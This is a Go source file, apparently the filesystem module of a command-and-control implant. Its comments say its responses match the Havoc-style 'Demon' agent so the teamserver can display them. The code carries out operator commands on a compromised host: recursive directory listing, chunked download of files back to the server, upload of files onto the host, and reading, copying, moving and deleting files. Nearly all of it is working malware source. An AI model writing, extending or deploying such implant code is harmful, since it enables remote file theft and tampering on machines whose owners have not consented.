package main

import (
	"crypto/rand"
	"encoding/binary"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// FS 模块：目录、下载、上传、cd/pwd/cat/cp/mv/rm/mkdir。
// 响应结构与 Windows Demon 保持一致，因此 teamserver/WebUI 无需改动即可展示。

type dirItem struct {
	name  string
	isDir bool
	size  int64
	mod   time.Time
}

type dirRoot struct {
	path  string
	files int
	dirs  int
	size  int64
	items []dirItem
}

func handleFS(p *parser, req uint32) {
	sub := p.i32()
	switch sub {
	case fsDir:
		handleDir(p, req)
	case fsDownload:
		handleDownload(p, req)
	case fsUpload:
		handleUpload(p, req)
	case fsCd:
		path := cleanPath(p.wstr())
		if err := os.Chdir(path); err != nil {
			sendError(req, "cd: "+err.Error())
			return
		}
		out := newPacker()
		out.i32(fsCd)
		out.wstr(path)
		enqueue(cmdFS, req, out.b)
	case fsRemove:
		path := cleanPath(p.wstr())
		st, err := os.Stat(path)
		if err != nil {
			sendError(req, "remove: "+err.Error())
			return
		}
		if err := os.Remove(path); err != nil {
			sendError(req, "remove: "+err.Error())
			return
		}
		out := newPacker()
		out.i32(fsRemove)
		out.boolean(st.IsDir())
		out.wstr(path)
		enqueue(cmdFS, req, out.b)
	case fsMkdir:
		path := cleanPath(p.wstr())
		if err := os.Mkdir(path, 0o755); err != nil {
			sendError(req, "mkdir: "+err.Error())
			return
		}
		out := newPacker()
		out.i32(fsMkdir)
		out.wstr(path)
		enqueue(cmdFS, req, out.b)
	case fsCopy:
		from := cleanPath(p.wstr())
		to := cleanPath(p.wstr())
		err := copyFile(from, to)
		out := newPacker()
		out.i32(fsCopy)
		out.boolean(err == nil)
		out.wstr(from)
		out.wstr(to)
		enqueue(cmdFS, req, out.b)
		if err != nil {
			sendOutput(req, "cp failed: "+err.Error())
		}
	case fsMove:
		from := cleanPath(p.wstr())
		to := cleanPath(p.wstr())
		err := os.Rename(from, to)
		out := newPacker()
		out.i32(fsMove)
		out.boolean(err == nil)
		out.wstr(from)
		out.wstr(to)
		enqueue(cmdFS, req, out.b)
		if err != nil {
			sendOutput(req, "mv failed: "+err.Error())
		}
	case fsPwd:
		cwd, err := os.Getwd()
		if err != nil {
			sendError(req, "pwd: "+err.Error())
			return
		}
		out := newPacker()
		out.i32(fsPwd)
		out.wstr(cwd)
		enqueue(cmdFS, req, out.b)
	case fsCat:
		path := cleanPath(p.wstr())
		out := newPacker()
		out.i32(fsCat)
		out.wstr(path)
		data, err := os.ReadFile(path)
		if err != nil {
			out.i32(0)
			enqueue(cmdFS, req, out.b)
			sendError(req, "cat: "+err.Error())
			return
		}
		if len(data) > 2*1024*1024 {
			data = data[:2*1024*1024]
		}
		out.i32(1)
		out.bytes(data)
		enqueue(cmdFS, req, out.b)
	default:
		sendError(req, "fs: unsupported subcommand "+itoa(int(sub)))
	}
}

// ---------------------------------------------------------------------------
// dir
// ---------------------------------------------------------------------------

func handleDir(p *parser, req uint32) {
	explorer := p.boolean()
	rawPath := p.wstr()
	subDirs := p.boolean()
	filesOnly := p.boolean()
	dirsOnly := p.boolean()
	listOnly := p.boolean()
	starts := p.wstr()
	contains := p.wstr()
	ends := p.wstr()

	pattern := dirPattern(rawPath)

	out := newPacker()
	out.i32(fsDir)
	out.boolean(explorer)
	out.boolean(listOnly)
	out.wstr(pattern)

	roots := listRoot(pattern, subDirs, filesOnly, dirsOnly, starts, contains, ends, 10)
	if len(roots) == 0 {
		out.boolean(false)
		enqueue(cmdFS, req, out.b)
		return
	}
	out.boolean(true)

	for _, root := range roots {
		// ListOnly 模式跳过空目录项（与 C Demon 的语义一致）
		if listOnly && len(root.items) == 0 {
			continue
		}
		out.wstr(root.path)
		out.i32(int32(root.files))
		out.i32(int32(root.dirs))
		if !listOnly {
			out.i64(root.size)
		}
		for _, it := range root.items {
			out.wstr(it.name)
			if listOnly {
				continue
			}
			out.boolean(it.isDir)
			out.i64(it.size)
			out.i32(int32(it.mod.Day()))
			out.i32(int32(it.mod.Month()))
			out.i32(int32(it.mod.Year()))
			out.i32(int32(it.mod.Minute()))
			out.i32(int32(it.mod.Hour()))
		}
	}
	enqueue(cmdFS, req, out.b)
}

func dirPattern(raw string) string {
	path := cleanPath(raw)
	if path == "" {
		path = "."
	}
	if !strings.ContainsAny(path, "*?[") {
		if st, err := os.Stat(path); err == nil && st.IsDir() {
			if strings.HasSuffix(path, "/") {
				path += "*"
			} else {
				path += "/*"
			}
		}
	}
	return path
}

func listRoot(pattern string, subDirs, filesOnly, dirsOnly bool, starts, contains, ends string, depth int) []dirRoot {
	matches, err := filepath.Glob(pattern)
	if err != nil {
		return nil
	}
	if len(matches) == 0 {
		// 空目录：Glob 无匹配，但目录本身存在，仍应返回一个空 root，
		// 否则 Web/Qt 文件浏览器会把空目录当成“读取失败”。
		if base := strings.TrimSuffix(pattern, "/*"); base != pattern {
			if st, statErr := os.Stat(base); statErr == nil && st.IsDir() {
				return []dirRoot{{path: pattern}}
			}
		}
		return nil
	}

	root := dirRoot{path: pattern}
	var subdirs []string
	for _, m := range matches {
		st, err := os.Stat(m)
		if err != nil {
			continue
		}
		name := filepath.Base(m)
		if name == "." || name == ".." {
			continue
		}
		isDir := st.IsDir()
		if isDir {
			if !subDirs && filesOnly {
				continue
			}
		} else if dirsOnly {
			continue
		}
		if !nameMatches(name, starts, contains, ends) {
			continue
		}
		if isDir {
			root.dirs++
			if subDirs {
				subdirs = append(subdirs, m)
			}
		} else {
			root.files++
			root.size += st.Size()
		}
		root.items = append(root.items, dirItem{
			name:  name,
			isDir: isDir,
			size:  st.Size(),
			mod:   st.ModTime(),
		})
	}

	roots := []dirRoot{root}
	if subDirs && depth > 1 {
		for _, sub := range subdirs {
			roots = append(roots, listRoot(sub+"/*", subDirs, filesOnly, dirsOnly,
				starts, contains, ends, depth-1)...)
		}
	}
	return roots
}

func nameMatches(name, starts, contains, ends string) bool {
	lower := strings.ToLower(name)
	if starts != "" && !strings.HasPrefix(lower, strings.ToLower(starts)) {
		return false
	}
	if contains != "" && !strings.Contains(lower, strings.ToLower(contains)) {
		return false
	}
	if ends != "" && !strings.HasSuffix(lower, strings.ToLower(ends)) {
		return false
	}
	return true
}

// ---------------------------------------------------------------------------
// download / upload
// ---------------------------------------------------------------------------

func handleDownload(p *parser, req uint32) {
	path := cleanPath(p.wstr())
	f, err := os.Open(path)
	if err != nil {
		sendError(req, "download: "+err.Error())
		return
	}
	defer f.Close()

	st, err := f.Stat()
	if err != nil || st.IsDir() {
		sendError(req, "download: not a regular file: "+path)
		return
	}

	var idb [4]byte
	rand.Read(idb[:])
	fileID := binary.LittleEndian.Uint32(idb[:])

	abs := path
	if a, err := filepath.Abs(path); err == nil {
		abs = a
	}

	head := newPacker()
	head.i32(fsDownload)
	head.i32(0) // mode: open
	head.i32(int32(fileID))
	head.i64(st.Size())
	head.wstr(abs)
	enqueue(cmdFS, req, head.b)

	buf := make([]byte, 1024*1024)
	for {
		n, err := f.Read(buf)
		if n > 0 {
			chunk := newPacker()
			chunk.i32(fsDownload)
			chunk.i32(1) // mode: write
			chunk.i32(int32(fileID))
			chunk.bytes(buf[:n])
			enqueue(cmdFS, req, chunk.b)
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			sendError(req, "download read: "+err.Error())
			break
		}
	}

	tail := newPacker()
	tail.i32(fsDownload)
	tail.i32(2) // mode: close
	tail.i32(int32(fileID))
	tail.i32(0) // reason: finished
	enqueue(cmdFS, req, tail.b)
}

func handleUpload(p *parser, req uint32) {
	path := cleanPath(p.wstr())
	memID := p.i32()
	data, ok := memFileGet(uint32(memID))
	if !ok {
		sendError(req, "upload: mem file not found or incomplete")
		return
	}
	if err := os.WriteFile(path, data, 0o644); err != nil {
		sendError(req, "upload: "+err.Error())
		return
	}
	out := newPacker()
	out.i32(fsUpload)
	out.i32(int32(len(data)))
	out.wstr(path)
	enqueue(cmdFS, req, out.b)
}

func copyFile(from, to string) error {
	in, err := os.Open(from)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.OpenFile(to, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o644)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

func cleanPath(p string) string {
	p = strings.TrimRight(p, "\x00")
	p = strings.TrimSpace(p)
	if p == "" {
		return "."
	}
	return p
}
